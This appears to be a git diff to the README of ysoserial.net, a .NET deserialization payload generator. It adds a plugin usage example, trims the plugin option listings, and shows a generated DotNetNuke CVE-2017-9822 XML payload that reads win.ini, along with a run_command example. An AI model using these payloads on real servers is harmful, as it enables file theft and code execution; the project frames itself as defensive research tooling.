@@ -8,6 +8,13 @@ It should be noted that the vulnerability lies in the application performing uns
 
 This project is inspired by [Chris Frohoff's ysoserial project](https://github.com/frohoff/ysoserial)
 
+## Plugins
+Ysoserial.Net can be used to generate raw payloads or more complex ones using a plugin architecture. To use plugins, use `-p <plugin name>` followed by the plugin options (the rest of ysoserial.net options will be ignored). Eg:
+
+```
+ysoserial.exe -p DotNetNuke -m read_file -f win.ini
+```
+
 ## Disclaimer 
 This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.
 
@@ -61,54 +68,11 @@ Available formatters:
 
 Available plugins:
         ApplicationTrust (Generates XML payload for the ApplicationTrust class)
-                Options:
-  -c, --command=VALUE        the command to be executed
-  -t, --test                 whether to run payload locally. Default: false
-        Clipboard (Generates payload for DataObject and copy it into the clipboard - ready to be pasted in affected apps)
-                Options:
-  -F, --format=VALUE         the object format: Csv, DeviceIndependentBitmap,
-                               DataInterchangeFormat, PenData, RiffAudio,
-                               WindowsForms10PersistentObject, System.String,
-                               SymbolicLink, TaggedImageFileFormat, WaveAudio.
-                               Default: System.String
-  -c, --command=VALUE        the command to be executed
-  -t, --test                 whether to run payload locally. Default: false
         DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)
-                Options:
-  -M, --mode=VALUE           the payload mode: read_file, upload_file,
-                               run_command.
-  -C, --command=VALUE        the command to be executed in run_command mode.
-  -U, --url=VALUE            the url to fetch the file from in write_file
-                               mode.
-  -F, --file=VALUE           the file to read in read_file mode or the file
-                               to write to in write_file_mode.
         altserialization (Generates payload for HttpStaticObjectsCollection or SessionStateItemCollection)
-                Options:
-  -M, --mode=VALUE           the payload mode: HttpStaticObjectsCollection or
-                               SessionStateItemCollection. Default:
-                               HttpStaticObjectsCollection
-  -o, --output=VALUE         the output format (raw|base64).
-  -c, --command=VALUE        the command to be executed
-  -t, --test                 whether to run payload locally. Default: false
         Resx (Generates RESX files)
-                Options:
-  -M, --mode=VALUE           the payload mode: indirect_resx_file,
-                               BinaryFormatter, SoapFormatter.
-  -c, --command=VALUE        the command to be executed in BinaryFormatter.
-                               If this is provided for SoapFormatter, it will
-                               be used as a file for
-                               ActivitySurrogateSelectorFromFile
-  -F, --file=VALUE           UNC file path location: this is used in
-                               indirect_resx_file mode.
         SessionSecurityTokenHandler (Generates XML payload for the SessionSecurityTokenHandler class)
-                Options:
-  -c, --command=VALUE        the command to be executed
-  -t, --test                 whether to run payload locally. Default: false
-        TransactionManagerReenlist (Generates payload for the TransactionManager.Reenlist method)
-                Options:
-  -c, --command=VALUE        the command to be executed
-  -t, --test                 whether to run payload locally. Default: false
-
+               
 Usage: ysoserial.exe [options]
 Options:
   -p, --plugin=VALUE         the plugin to be used
@@ -152,7 +116,7 @@ ysoserial.exe -p DotNetNuke -M run_command -C calc.exe
 
 ### Generate a read_file payload for DotNetNuke using its plugin
 ```
-ysoserial.exe -p DotNetNuke -M read_file -F win.ini
+ysoserial.exe -p DotNetNuke -m read_file -f win.ini
 <profile><item key="name1: key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">win.ini</anyType></MethodParameters><ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
 ```
 
